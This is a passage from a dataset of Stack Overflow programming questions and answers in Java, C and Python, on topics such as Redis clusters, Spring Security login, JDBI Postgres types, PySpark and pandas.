    .socketTimeoutMillis(4000);

Also, make sure the cluster has reached a stable state after slots were configured.
Here is a more complete example using Option 2 with hostAndPortMapper. This is rough code and is provided purely as an example for demonstration purposes:
import com.github.dockerjava.api.model.*;
import com.redis.testcontainers.RedisContainer;
import org.apache.commons.pool2.impl.GenericObjectPoolConfig;
import org.testcontainers.containers.Network;
import org.testcontainers.containers.output.*;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.utility.DockerImageName;
import redis.clients.jedis.*;

import java.util.*

import static redis.clients.jedis.Protocol.CLUSTER_HASHSLOTS;

class ScratchJedisClusterWithTestContainers {

  public static void main(String[] args) {
    int i = 0;

    int externalPort = 7379;
    int port = 6379;
    Network network = Network.newNetwork();
    RedisContainer redisContainer = new RedisContainer(DockerImageName.parse(""redis:7.0.5""))
        // Use static port binding together with  cluster-announce-port
        //.withCreateContainerCmdModifier(cmd -> cmd.withPortBindings(
        //    new PortBinding(Ports.Binding.bindPort(externalPort), ExposedPort.tcp(port))))
        .withCommand(""redis-server --port "" + port +
        //    "" --cluster-announce-port "" + externalPort +
            "" --cluster-enabled yes"" +
            "" --cluster-config-file nodes.conf""+
            "" --cluster-node-timeout 5000""+
            "" --appendonly yes"" +
            "" --bind 0.0.0.0"" )
        .withNetwork(network)
        .withNetworkMode(""bridge"")
        .withNetworkAliases(""redis-"" + i)
        .waitingFor(Wait.forListeningPort());


    // Lambda-based HostAndPortMapper
    HostAndPortMapper nat = hostAndPort -> {
      if (hostAndPort.getPort() == port) {
        return new HostAndPort(redisContainer.getHost(), redisContainer.getMappedPort(port));
      }
      return hostAndPort;
    };

    redisContainer.withLogConsumer((OutputFrame frame) -> System.out.println(frame.getUtf8String()));

    redisContainer.start();

    Set<HostAndPort> hosts = new HashSet<>();
    String redisHost = ""127.0.0.1"";
    int redisPort = redisContainer.getMappedPort(port+i);
    hosts.add(new HostAndPort(redisHost, redisPort));


    int[] node1Slots = new int[CLUSTER_HASHSLOTS];
    for (int j = 0; j < CLUSTER_HASHSLOTS; j++) {
      node1Slots[j] = j;
    }

    //        Connect to the cluster using Jedis with a password
    DefaultJedisClientConfig.Builder jedisClientConfig = DefaultJedisClientConfig.builder()
    //    .password(redisPassword)
        .hostAndPortMapper(nat)
        .ssl(false)
        .connectionTimeoutMillis(10000)
        .socketTimeoutMillis(4000);

    try(Jedis jedisnode = new Jedis(hosts.iterator().next(),jedisClientConfig.build())){
      jedisnode.clusterAddSlots(node1Slots);
      // await cluster to be ready
      awaitClusterReady(jedisnode, 10, 1000);
      System.out.println(jedisnode.clusterInfo());
      System.out.println(jedisnode.clusterNodes());
    }

    GenericObjectPoolConfig poolConfig = new GenericObjectPoolConfig();
    poolConfig.setMaxTotal(Runtime.getRuntime().availableProcessors());
    poolConfig.setMaxIdle(Runtime.getRuntime().availableProcessors());
    poolConfig.setMinIdle(Runtime.getRuntime().availableProcessors());
    poolConfig.setMaxWaitMillis(2000);



    System.out.println(""Hosts "" + hosts);
    try (JedisCluster jedis = new JedisCluster(hosts, jedisClientConfig.build(), 3, poolConfig)) {

      Map<String, ConnectionPool> nodes = jedis.getClusterNodes();
      //System.out.println(""Connected cluster nodes: "" + nodes);
      nodes.forEach((key, value) -> System.out.println(key));
      jedis.set(""key"", ""value""); // This is where the error is seen
      System.out.println(""Key set in Redis Cluster: "" + jedis.get(""key""));
    }
    
  }

  private static void awaitClusterReady(Jedis jedis, int maxAttempts, int delayMillis) {
    for (int attempt = 1; attempt <= maxAttempts; attempt++) {
      String clusterInfo = jedis.clusterInfo();
      if (clusterInfo.contains(""cluster_state:ok"") && clusterInfo.contains(""cluster_slots_assigned:16384"")) {
        System.out.println(""Cluster is ready!"");
        return;
      }
      System.out.println(""Attempt "" + attempt + "": Cluster not ready. Retrying..."");
      try {
        Thread.sleep(delayMillis); // Wait before the next attempt
      } catch (InterruptedException e) {
        Thread.currentThread().interrupt();
        throw new RuntimeException(""Sleep interrupted"", e);
      }
    }
    throw new RuntimeException(""Cluster not ready after "" + maxAttempts + "" attempts."");
  }
}

",java
cannot compile x86 in gcc crunchbang,"I cannot seem to use GCC to compile C as x86. I am using crunchbang.
Simple C test file:
#include <stdio.h>

int main(){
    printf(""Test x86"");
}

When compiled with:gcc -o 64 test.cI get no errors or output whatsoever.
However, when compiled with:gcc -o 64 -m32 test.c I am greeted with:
In file included from /usr/include/features.h:356:0,
                 from /usr/include/stdio.h:28,
                 from test.c:1:
/usr/include/x86_64-linux-gnu/sys/cdefs.h:359:27: fatal error: bits/wordsize.h: No such file or directory
compilation terminated.

Now, browsing those files, it seems as if they are in the wrong folder because. I'm not sure what to do here.
Contents of /usr/include/features.h:586
#  include <x86_64-linux-gnu/sys/cdefs.h>

Which gives an error on line 359. That line is shown here: 
#include <bits/wordsize.h>

The file is ACTUALLY located here:
/usr/include/x86_64-linux-gnu/bits/wordsize.h
","GCC should support or run with multilib to eliminate this error.
",c
scanf variable length specifier,"How can I use a variable to specify the max number of chars scanf() should read in?
For example using printf() you can use the * like so
#define MAXVAL 5
printf(""Print at maximum MAXVAL chars: %.*s\n"", MAXVAL, ""myStringHere"");

This will only print 5 chars, how can I make scanf only read in MAXVAL? MAXVAL must be used as the length specifier. I cannot simply do
scanf(""%5s"", string);

Right now I can only think of reading into a large array using scanf then using ssprintf to store the string into my length limited string. Using a length specifier would be so much easier however.
","You can use the C preprocessor to help you with that.
#define STR2(x) #x
#define STR(X) STR2(X)
scanf(""%"" STR(MAXVAL) ""s"", string);

The processor combines ""%"" STR(MAXVAL) ""s"" to ""%5s""
",c
no module named packaging,"I work on Ubuntu 14. I install python3 and pip3.
When I try to use pip3, I have this error
Traceback (most recent call last):
  File ""/usr/local/bin/pip3"", line 6, in <module>
    from pkg_resources import load_entry_point
  File ""/usr/local/lib/python3.5/dist-packages/pkg_resources/__init__.py"", line 70, i
n <module>
    import packaging.version
ImportError: No module named 'packaging'

Does anyone know what is the issue?
","If I understand well, the issue that causes confusion in other's replies is that you have an error while running pip itself, which prevents self-updates of pip or installation of the missing package.
As requested, please state exactly how you installed Python 3 and pip. Ubuntu 14 does not come with Python 3.5.
For diagnosis, please give the output of
which python3

that is probably /usr/bin/python3 and refers to the system-wide python3 while your pip is located in /usr/local/bin/pip3.
Suggested solution: Uninstall system pip with apt-get remove python3-pip and try again with either pip3 or python3.5 -m pip.
",python
spring security form don39t want to login,"I created an form to log in in Spring Security. Registration is working fine but there is something wrong with loggin in.
When I try to log in there is an log:
2025-01-19T23:46:34.220+01:00  WARN 388 --- [TrippiApp] [nio-8080-exec-4] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpRequestMethodNotSupportedException: Request method 'POST' is not supported]
Login into default loging page is available so I assume there is something wrong with SecurityFilterChain
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf.disable()).authorizeHttpRequests(requests -> requests
                .dispatcherTypeMatchers().permitAll()
                .requestMatchers(""/CSS/**"").permitAll()
                .requestMatchers(""/login /register /search"").hasAnyRole(""USER"", ""ADMIN"")
                .anyRequest().authenticated()
        )
        .formLogin(login -> login
                .loginPage(""/login"")
                .loginProcessingUrl(""/userAuth"")
                .defaultSuccessUrl(""/register"")
                .failureForwardUrl(""/login?error"")
                .permitAll())
        .logout(logout -> logout.logoutRequestMatcher(new AntPathRequestMatcher(""/logout""))
                .permitAll());

        return http.build();
    }
}

@Controller
public class AuthorisationController {

    private UserService userService;

    public AuthorisationController(UserService userService) {
        this.userService = userService;
    }


    @GetMapping(""/login"")
    public String login() {
        return ""login"";
    }

<!DOCTYPE html>
<html xmlns:th=""http://thymeleaf.org""
      xmlns:layout=""http://www.ultraq.net.nz/thymeleaf/layout""
      layout:decorate=""~{layout}"">
<head>
    <link rel=""stylesheet"" type=""text/css"" href=""/CSS/style.css"" />
    <meta charset=""UTF-8"" />
    <title>Register</title>
</head>

<body>
<div class=""navbar"">
    <div class=""button""><a href="""" class=""nav-btn"">Konto</a></div>
    <div class=""button""><a href="""" class=""nav-btn"">Szukaj</a></div>
    <div class=""button""><a href="""" class=""nav-btn"">Wiadomości</a></div>
    <div class=""button""><a href="""" class=""nav-btn"">Logowanie</a></div>
    <div class=""button""><a href="""" class=""nav-btn"">Rejestracja</a></div>
    <div class=""button""><a href="""" class=""nav-btn"">Wyloguj</a></div>
</div>
<div class=""main"">
    <div class=""sidebar"">
        <h2>Użytkownik</h2>
    </div>

    <div class=""mainpage"">
        <h2>Logowanie</h2>

        <div th:if=""${param.error}"" class=""alert alert-success"">
            Zły nick lub hasło!
        </div>
        <div th:if=""${param.logout}"" class=""alert alert-success"">
            Wylogowałeś się!
        </div>
        <div class=""register"">
            <form method=""POST"" role=""form"" th:action=""@{/login}"">

                <div class=""info"">
                    Nick:
                    <input
                            id=""nickName""
                            type=""text""
                            name=""nickName""
                            placeholder=""Podaj nick""
                            class=""form-in""
                    />
                </div>

                <div class=""info"">
                    Hasło:
                    <input
                            id=""password""
                            type=""password""
                            name=""password""
                            placeholder=""Podaj hasło""
                            class=""form-in""
                    />
                </div>

                <button value =""Log in"" type=""submit"" class=""btn-send"">Zaloguj</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>

I have tried to toggle in filter parameters but so far with no results.
","This happens because you specified the loginProcessingUrl to be /userAuth, and not /login. You're then sending the form to /login, through
<form method=""POST"" role=""form"" th:action=""@{/login}"">

but Spring already configured a controller at /userAuth for you, because you explicitly specified that.
One solution would be to also change the th:action to send the requests at @{/userAuth}.
Another workaround would be to change the loginProcessingUrl to /login. However, you can also simply remove the statement that manually configures the login processing URL. Not specifying any loginProcessingUrl automatically makes Spring configure it as the /login endpoint.
",java
compiling libssh2 in windows with nmake not producing a static library,"I am trying to compile libssh2 under Windows with Visual Studio nmake. I am producing a shared library (DLL) but not producing a static library (LIB).
I've gone through hours of reading their documentation but have found no mention of generating the static library. Normally, I'd assume it would be generated alongside the DLL but that is not the case.
Command line looks like so:
nmake /f NMakefile

","Figured it out. You have to create the build environment with CMake. Add your CMake bin directory to the environment PATH variable.
With command prompt inside root libssh2:
mkdir build
cd build
cmake -G ""Visual Studio 14 2015 Win64"" ..
cmake --build .

This will create a MDd static debug library.
For a regular MD static release library, run:
cmake --build . --config Release

",c
how can i separate tokens when there are some null tokens,"I have a line in the .csv file as
abc,bcc,
I have to separate it into three tokens abc, bcc  and  null.
First, I tried StringTokenizer but it did not return a null token. Then, I tried String.split("","") but it also did not return null at the end; it returned a string which has null in between but not at the end.
so please help me
thanks in advance.
","Try the String.split() variant that takes a limit and pass a negative number to it.
",java
c structserror parameter name omitted,"I am receiving the following error for the following code:
kernel/proc.c: In function ‘getpinfo’:
kernel/proc.c:495: error: parameter name omitted

The code is as follows:
int 
getpinfo(struct pstat *)
{
}

Can you please tell me what I am missing about the struct or the code?
","     int 
     getpinfo(struct pstat *)   
      {
      }

Did not given any parameter Name.
Function definition should contain List of parameters, with valid type and parameters names.where as in declarations parameter Names are optional 
This should be
     int 
     getpinfo(struct pstat *some_name)
       {
       }

",c
adding quotes to list objects to format as a dictionary pyspark,"I have a column of my dataframe data that contains date and value information in a long string. The column, we will call x for this purpose, is formatted as such:
x = ""{date1:val1, date2:val2, date3:val3, ...}"" 

I want to ultimately explode this data such that I create two new columns, one for date and one for val. In order to utilize the explode function, I understand that the column must be formatted as an array, not a string. So far, to handle this issue, I have removed the braces at the start and end of the string:
from pyspark.sql import functions as F

data = data.withColumn('x_1', F.regexp.replace('x', r'\{', ''))
data = data.withColumn('x_1', F.regexp.replace('x_1', r'\}', '') 

I then created a list variable:
data = data.withColumn('x_list', F.split('x_1', ', '))

I now have that x_list = [date1:val1, date2:val2, date3:val3, ...]
What I now need is to add quotes around each list element such that I ultimately get ['date1':'val1', 'date2':'val2', 'date3':'val3', ...]
I believe that it may be possible to iterate through the list and use regex to add quotes using the colon (:) as a split point, but I am struggling with how to do that. I believe that it would look something like:
for l in x_list:
   #some regex expression

Alternatively, I have considered creating a sublist of each list element, but I am not sure how I would then use those sublists to create two new columns.
","This way you could avoid using udf :)
date_val_string = ""{date1:val1, date2:val2, date3:val3}""
(
    spark.createDataFrame(pd.DataFrame({""col"": [date_val_string]}))
    .withColumn(""array1"", f.expr(""split(regexp_replace(col, '[{}]', ''), ', ')""))
    .withColumn(""array2"", f.expr(""transform(array1, x->split(x, ':'))""))
    .selectExpr(""explode(array2) as date_val"")
    .selectExpr(""date_val[0] as date"", ""date_val[1] as val"")
    .show(truncate = False)
)


+-----+----+
|date |val |
+-----+----+
|date1|val1|
|date2|val2|
|date3|val3|
+-----+----+

",python
emulating a packed structure in portable c,"I have the following structure:
typedef struct Octree {
    uint64_t *data;
    uint8_t alignas(8) alloc;
    uint8_t dataalloc;
    uint16_t size, datasize, node0;
    // Node8 is a union type with of size 16 omitted for brevity
    Node8 alignas(16) node[]; 
} Octree;

In order for the code that operates on this structure to work as intended, it is necessary that node0 immediately precedes the first node such that ((uint16_t *)Octree.node)[-1] will access Octree.node0. Each Node8 is essentially a union holding 8 uint16_t. With GCC I could force pack the structure with #pragma pack(push) and #pragma pack(pop). However this is non-portable. Another option is to:

Assume sizeof(uint64_t *) <= sizeof(uint64_t)
Store the structure as just 2 uint64_t followed immediately by the node data, and the members are accessed manually via bitwise arithmetic and pointer casts

This option is quite impractical. How else could I define this 'packed' data structure in a portable way? Are there any other ways?
","The C language standard does not allow you to specify a struct's memory layout down to the last bit. Other languages do (Ada and Erlang come to mind), but C does not.
So if you want actual portable standard C, you specify a C struct for your data, and convert from and to specific memory layout using pointers, probably composing from and decomposing into a lot of uint8_t values to avoid endianness issues. Writing such code is error prone, requires duplicating memory, and depending on your use case, it can be relatively expensive in both memory and processing.
If you want direct access to a memory layout via a struct in C, you need to rely on compiler features which are not in the C language specification, and therefore are not ""portable C"".
So the next best thing is to make your C code as portable as possible while at the same time preventing compilation of that code for incompatible platforms. You define the struct and provide platform/compiler specific code for each and every supported combination of platform and compiler, and the code using the struct can be the same on every platform/compiler.
Now you need to make sure that it is impossible to accidentally compile for a platform/compiler where the memory layout is not exactly the one your code and your external interface require.
Since C11, that is possible using static_assert, sizeof and offsetof.
So something like the following should do the job if you can require C11 (I presume you can require C11 as you are using alignas which is not part of C99 but is part of C11). The ""portable C"" part here is you fixing the code for each platform/compiler where the compilation fails due to one of the static_assert declarations failing.
#include <assert.h>
#include <stdalign.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>

typedef uint16_t Node8[8];

typedef struct Octree {
    uint64_t *data;
    uint8_t alignas(8) alloc;
    uint8_t dataalloc;
    uint16_t size, datasize, node0;
    Node8 alignas(16) node[];
} Octree;

static_assert(0x10 == sizeof(Octree),              ""Octree size error"");
static_assert(0x00 == offsetof(Octree, data),      ""Octree data position error"");
static_assert(0x08 == offsetof(Octree, alloc),     ""Octree alloc position error"");
static_assert(0x09 == offsetof(Octree, dataalloc), ""Octree dataalloc position error"");
static_assert(0x0a == offsetof(Octree, size),      ""Octree size position error"");
static_assert(0x0c == offsetof(Octree, datasize),  ""Octree datasize position error"");
static_assert(0x0e == offsetof(Octree, node0),     ""Octree node0 position error"");
static_assert(0x10 == offsetof(Octree, node),      ""Octree node[] position error"");

The series of static_assert declarations could be written more concisely with less redundant source code typing for the error messages using a preprocessor macro stringifying the struct name, member name, and maybe size/offset value.
Now that we have nailed down the struct member sizes and offsets within the struct, two aspects still need checks.

The integer endianness your code expects is the same endianness your memory structure contains. If the endianness happens to be ""native"", you have nothing to check for or to handle conversions. If the endianness is ""big endian"" or ""little endian"", you need to add some checks and/or do conversions.

As noted in the comments to the question, you will need to verify separately that the undefined behaviour &(((uint16_t *)octree.node)[-1]) == &octree.node0 actually is what you expect it to be on this compiler/platform.
Ideally, you would find a way to write this as a separate static_assert declaration. However, such a test is quick and short enough that you can add such a check to the runtime code in a rarely but guaranteed to be run function like a global initialization function, a library initialization functions, or maybe even a constructor. Do be cautious though if you use the assert() macro for that check, as that runtime check will turn into a no-op if the NDEBUG macro is defined.


",c
convert date to datetime in python,"Is there a built-in method for converting a date to a datetime in Python, for example getting the datetime for the midnight of the given date? The opposite conversion is easy: datetime has a .date() method.
Do I really have to manually call datetime(d.year, d.month, d.day)?
","You can use datetime.combine(date, time); for the time, you create a datetime.time object initialized to midnight.
from datetime import date
from datetime import datetime

dt = datetime.combine(date.today(), datetime.min.time())

",python
how to use valgrind on qnx platform,"According to the official documents of valgrind, QNX is not supported.
Howerver, I saw some questions about using valgrind on QNX. question1
question2.
This confused me. Is it possible to run Valgrind on QNX?
If it is possible, how can this be achieved?
Perhaps compiling an executable file that compatible with the QNX platform? or is there a way to download the correct files?
I found the Valgrind project on QNX community.
I downloaded the package.
Howerver, it did not contain files about the arm64/aarch64 architecture which I needed.
","You will probably need to download the source (from here https://community.qnx.com/sf/scm/do/listRepositories/projects.valgrind/scm) and build it.
It doesn't look like it has been maintained for 7 years (Valgrind 3.11) so I think that getting it to build and work will be a substantial effort unless QNX and the toolchain have not changed much in the same time.
",c
how to use a postgresql custom type as a nested pojo in jdbi,"I am trying to do something which I think should be relatively straight-forward with JDBI v3 (using the sql-object and postgres extensions).
I have an Item class:
public class Item {
    private String itemNumber;
    private Dimension3D dimensions;

    public Item(String itemNumber, Dimension3D dimensions) {
        this.itemNumber = itemNumber;
        this.dimensions = dimensions;
    }

    public String getItemNumber() {
        return itemNumber;
    }

    public Dimension3D getDimensions() {
        return dimensions;
    }
}

The Dimension3D class is:
public class Dimension3D {
    private BigDecimal width, length, height;
    private LengthUnit lengthUnit; // This is an enum, defaults to INCH.

    public Dimension3D(BigDecimal width, BigDecimal length, BigDecimal height) {
        this.width = width;
        this.length = length;
        this.height = height;
        this.unit = LengthUnit.INCH;
    }

    // Getters and setters.
}

I am using the following table schemas for items:
@SqlUpdate(""""""
        CREATE TABLE items  (
            item_number VARCHAR(7) NOT NULL PRIMARY KEY CHECK (item_number ~ '^[0-9]{6}[ab]?$'),
            dimensions dimension_3d NOT NULL DEFAULT (0, 0, 0, 'inch'),
        );
        """""")
void createTable();

The dimension_3d type is created thusly:
@SqlScript(""""""
        CREATE TYPE spatial_unit AS ENUM ('inch', 'metric');
        
        CREATE TYPE dimension_3d AS (
            width numeric,
            length numeric,
            height numeric,
            unit spatial_unit
        );
        """""")
void createTypes();

I am trying to make an insertItem method which takes an Item POJO:
@SqlUpdate(""insert into items (item_number, dimensions) "" +
        ""values (:itemNumber, :dimensions)"")
@RegisterColumnMapper(Dimension3DColumnMapper.class)
void insertItem(@BindBean Item item);

In order to try and make this work I have the above referenced Dimension3DColumnMapper (not sure that this is necessary):
public class Dimension3DColumnMapper implements ColumnMapper<Dimension3D> {
    @Override
    public Dimension3D map(ResultSet r, int columnNumber, StatementContext ctx) throws SQLException {
        return new Dimension3D(r.getBigDecimal(""length""), r.getBigDecimal(""width""), r.getBigDecimal(""height""), LengthUnit.INCH);
    }
}

Finally I call these methods thusly:
@Test
public void testCreateTables(Jdbi jdbi) {
    jdbi.installPlugin(new SqlObjectPlugin());
    jdbi.installPlugin(new PostgresPlugin());
    jdbi.withHandle(handle -> {
        handle.registerArgument(new Dimension3DArgumentFactory());
        handle.configure(PostgresTypes.class, pt -> pt.registerCustomType(Dimension3DPGType.class, ""dimension_3d""));
        handle.attach(ItemQueries.class).createTypes();
        handle.attach(ItemQueries.class).insertItem(new Item(""00001"", new Dimension3D(new BigDecimal(""1""), new BigDecimal(""1""), new BigDecimal(""1""), LengthUnit.INCH));
    });
}

My attempt to make this work seamlessly has led me to register a custom ArgumentFactory defined thusly:
public class Dimension3DArgumentFactory extends AbstractArgumentFactory<Dimension3D> {

    public Dimension3DArgumentFactory() {
        super(Types.NUMERIC);
    }

    @Override
    protected Argument build(Dimension3D value, ConfigRegistry config) {
        return (position, statement, ctx) -> {
            statement.setBigDecimal(position, value.getLength());
            statement.setBigDecimal(position + 1, value.getWidth());
            statement.setBigDecimal(position + 2, value.getHeight());
        };
    }
}

I also tried to register the dimension_3d custom type (as seen above) which is:
public class Dimension3DPGType extends PGobject {
    private Dimension3D dimension3D;

    public Dimension3DPGType(BigDecimal length, BigDecimal width, BigDecimal height) {
        this();
        this.dimension3D = new Dimension3D(length, width, height, LengthUnit.INCH);
    }

    public Dimension3DPGType() {
        setType(""dimension_3d"");
    }

    public BigDecimal getWidth() {
        return dimension3D.getWidth();
    }

    public void setWidth(BigDecimal width) {
        dimension3D = new Dimension3D(width, dimension3D.getLength(), dimension3D.getHeight(), LengthUnit.INCH);
    }

    public BigDecimal getLength() {
        return dimension3D.getLength();
    }

    public void setLength(BigDecimal length) {
        dimension3D = new Dimension3D(getWidth(), length, dimension3D.getHeight(), LengthUnit.INCH);
    }

    public BigDecimal getHeight() {
        return dimension3D.getHeight();
    }

    public void setHeight(BigDecimal height) {
        dimension3D = new Dimension3D(dimension3D.getWidth(), dimension3D.getLength(), height, LengthUnit.INCH);
    }

    @Override
    public String getValue() {
        return ""("" + getWidth() + "","" + getLength() + "","" + getHeight() + "")"";
    }

    @Override
    public void setValue(String value) {
        PGtokenizer t = new PGtokenizer(PGtokenizer.removePara(value), ',');

        BigDecimal length = new BigDecimal(t.getToken(0));
        BigDecimal width = new BigDecimal(t.getToken(1));
        BigDecimal height = new BigDecimal(t.getToken(2));
        dimension3D = new Dimension3D(length, width, height, LengthUnit.INCH);
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) {
            return true;
        }
        if (!(o instanceof Dimension3DPGType that)) {
            return false;
        }
        if (!super.equals(o)) {
            return false;
        }
        return Objects.equals(dimension3D, that.dimension3D);
    }

    @Override
    public int hashCode() {
        return dimension3D.hashCode();
    }
}

I have tried this with/without the ColumnMapper, ArgumentFactory, and custom type registration.
The current exception I'm facing is:
[ERROR]   DatabaseTest.testCreateTables:21->lambda$testCreateTables$1:29 » UnableToExecuteStatement org.postgresql.util.PSQLException: ERROR: column ""dimensions"" is of type dimension_3d but expression is of type numeric
  Hint: You will need to rewrite or cast the expression.

Attempting to correct this with using casts like below:
@SqlUpdate(""insert into items (item_number, dimensions) "" +
        ""values (:itemNumber, CAST(:dimensions AS dimension_3d))"")
@RegisterColumnMapper(Dimension3DColumnMapper.class)
void insertItem(@BindBean Item item);


then produces the exception:
DatabaseTest.testCreateTables:21->lambda$testCreateTables$1:29 » UnableToExecuteStatement org.postgresql.util.PSQLException: ERROR: cannot cast type numeric to dimension_3d

For reference I am using the following dependency versions:
<dependency>
    <groupId>org.jdbi</groupId>
    <artifactId>jdbi3-core</artifactId>
    <version>3.47.0</version>
</dependency>
<dependency>
    <groupId>org.jdbi</groupId>
    <artifactId>jdbi3-sqlobject</artifactId>
    <version>3.47.0</version>
</dependency>
<dependency>
    <groupId>org.jdbi</groupId>
    <artifactId>jdbi3-postgres</artifactId>
    <version>3.47.0</version>
</dependency>
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.7.4</version>
</dependency>
<dependency>
    <groupId>org.jdbi</groupId>
    <artifactId>jdbi3-testing</artifactId>
    <version>3.47.0</version>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>de.softwareforge.testing</groupId>
    <artifactId>pg-embedded</artifactId>
    <version>5.2.0</version>
    <scope>test</scope>
</dependency>

Thanks very much for any assistance!
Update:
I tried the following:
package com.dow.inventory.db;

import com.dow.items.Dimension3D;
import org.jdbi.v3.core.argument.AbstractArgumentFactory;
import org.jdbi.v3.core.argument.Argument;
import org.jdbi.v3.core.config.ConfigRegistry;

import java.sql.Types;

public class Dimension3DArgumentFactory extends AbstractArgumentFactory<Dimension3D> {

    public Dimension3DArgumentFactory() {
        super(Types.OTHER);
    }

    @Override
    protected Argument build(Dimension3D value, ConfigRegistry config) {
        final Dimension3DPGType dimension3d = new Dimension3DPGType(value);
        return (i, p, cx) -> p.setObject(i, dimension3d, Types.OTHER);
    }
}

but this leads to:
UnableToExecuteStatement org.postgresql.util.PSQLException: ERROR: malformed record literal: ""(10.75,8.5,7.25)""
This String is coming from:
@Override
public String getValue() {
    return ""("" + getWidth() + "","" + getLength() + "","" + getHeight() + "")"";
}

Don't know what the correct format is for this to work...
Update 2:
I think I'm getting closer with:
@Override
public String getValue() {
    return ""(ROW("" + getWidth() + "","" + getLength() + "","" + getHeight() + ""))"";
}

because this then leads to the exception for trying to ""deserialize"":
org.jdbi.v3.core.statement.UnableToExecuteStatementException:
org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: ""ROW(10.75""
Don't know where this is coming from though because I use the following substring to set the value:
@Override
public void setValue(String value) {
    String[] parts = value.substring(5, value.length() - 2).split("","");

    BigDecimal width = new BigDecimal(parts[0]);
    BigDecimal length = new BigDecimal(parts[1]);
    BigDecimal height = new BigDecimal(parts[2]);

    dimension3D = new Dimension3D(width, length, height, LengthUnit.INCH);
}


I don't know why using just parentheses leads to a malformed record literal ERROR: malformed record literal: ""(10.75,8.5,7.25)"" as that it what is done here.
Update 3:
Seems like not including the length_unit doesn't work, this is now super close:
    @Override
    public String getValue() {
        return ""("" + getWidth() + "","" + getLength() + "","" + getHeight() + "",'inch')"";
    }

but this yields:
UnableToExecuteStatement org.postgresql.util.PSQLException: ERROR: invalid input value for enum spatial_unit: ""'inch'""
","I have figured this out.
Here's the PGObject implementation that makes this work:
package com.dow.inventory.db;

import com.dow.items.Dimension3D;
import com.dow.items.LengthUnit;
import org.postgresql.util.PGobject;
import org.postgresql.util.PGtokenizer;

import java.math.BigDecimal;
import java.util.Objects;

public class Dimension3DPGType extends PGobject {
    private Dimension3D dimension3D;

    public Dimension3DPGType(BigDecimal length, BigDecimal width, BigDecimal height) {
        this();
        this.dimension3D = new Dimension3D(length, width, height, LengthUnit.INCH);
    }

    public Dimension3DPGType(Dimension3D dimension3D) {
        this();
        this.dimension3D = dimension3D;
    }

    public Dimension3DPGType(String value) {
        setValue(value);
    }

    public Dimension3DPGType() {
        setType(""dimension_3d"");
    }

    public BigDecimal getWidth() {
        return dimension3D.getWidth();
    }

    public void setWidth(BigDecimal width) {
        dimension3D = new Dimension3D(width, dimension3D.getLength(), dimension3D.getHeight(), LengthUnit.INCH);
    }

    public BigDecimal getLength() {
        return dimension3D.getLength();
    }

    public void setLength(BigDecimal length) {
        dimension3D = new Dimension3D(getWidth(), length, dimension3D.getHeight(), LengthUnit.INCH);
    }

    public BigDecimal getHeight() {
        return dimension3D.getHeight();
    }

    public void setHeight(BigDecimal height) {
        dimension3D = new Dimension3D(dimension3D.getWidth(), dimension3D.getLength(), height, LengthUnit.INCH);
    }

    @Override
    public String getValue() {
        return ""("" + getWidth() + "","" + getLength() + "","" + getHeight() + "",\""inch\"")"";
    }

    @Override
    public void setValue(String value) {
        String[] parts = value.substring(1, value.length() - 1).split("","");

        BigDecimal width = new BigDecimal(parts[0]);
        BigDecimal length = new BigDecimal(parts[1]);
        BigDecimal height = new BigDecimal(parts[2]);

        dimension3D = new Dimension3D(width, length, height, LengthUnit.INCH);
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) {
            return true;
        }
        if (!(o instanceof Dimension3DPGType that)) {
            return false;
        }
        if (!super.equals(o)) {
            return false;
        }
        return Objects.equals(dimension3D, that.dimension3D);
    }

    @Override
    public int hashCode() {
        return dimension3D.hashCode();
    }
}

With the following argument factory:
public class Dimension3DArgumentFactory extends AbstractArgumentFactory<Dimension3D> {

    public Dimension3DArgumentFactory() {
        super(Types.OTHER);
    }

    @Override
    protected Argument build(Dimension3D value, ConfigRegistry config) {
        final Dimension3DPGType dimension3d = new Dimension3DPGType(value);
        return (i, p, cx) -> p.setObject(i, dimension3d, Types.OTHER);
    }
}

We then register this custom type on the handle:
handle.configure(PostgresTypes.class, pt -> pt.registerCustomType(Dimension3DPGType.class, ""dimension_3d""));

and our ItemQuery is successful:
@SqlUpdate(""insert into items (item_number, dimensions) "" +
        ""values (:itemNumber, :dimensions)"")
@RegisterArgumentFactory(Dimension3DArgumentFactory.class)
void insertItem(@BindBean Item item);

What's really cool is it seems like our default enum value trick does work because we can do the following:
@Override
public String getValue() {
    return ""("" + getWidth() + "","" + getLength() + "","" + getHeight() + "",)"";
}

and it will automatically set the value to inch.
",java
gstreamer usage of g_signal_emit_by_name,"I am developing an application which plays H264 dump using gstreamer
The pipeline is: appsrc - h264parse - ffdec_h264 - ffmpegcolorspace - deinterlace - autovideosink
And data flow is :: PULL Mode from appsrc { using the signals: need-data}
I want to verify the same application using PUSH mode from application: In the documentation it is mentioned that: we need to invoke push-buffer signals and send the buffers
My code snippet is:
gst_app_src_set_emit_signals(source, TRUE);
g_signal_connect (source, ""push-buffer"", G_CALLBACK (start_feed), source);

Though the pipeline is created, I am not getting any callbacks to : start_feed()
Can anyone help me, what exactly need to do for PUSH mode operation of appsrc.
","According to the documentation:

Make appsrc emit the ""new-preroll"" and ""new-buffer"" signals. This option is by default disabled because signal emission is expensive and unneeded when the application prefers to operate in pull mode.

So, you could try adding a ""new-buffer"" signal. ""push-buffer"" is an action, so attaching a signal handler won't do anything because it's something you're supposed to call when you have data, not something that calls a callback.
Depending on what your start_feed does, you may also be looking for the ""need-data"" signal (presumably signals when the pipeline needs more data).
",c
drop all data in a pandas dataframe,"I would like to drop all data in a pandas dataframe, but am getting TypeError: drop() takes at least 2 arguments (3 given). I essentially want a blank dataframe with just my columns headers.
import pandas as pd

web_stats = {'Day': [1, 2, 3, 4, 2, 6],
             'Visitors': [43, 43, 34, 23, 43, 23],
             'Bounce_Rate': [3, 2, 4, 3, 5, 5]}
df = pd.DataFrame(web_stats)

df.drop(axis=0, inplace=True)
print df

","You need to pass the labels to be dropped.
df.drop(df.index, inplace=True)

By default, it operates on axis=0.
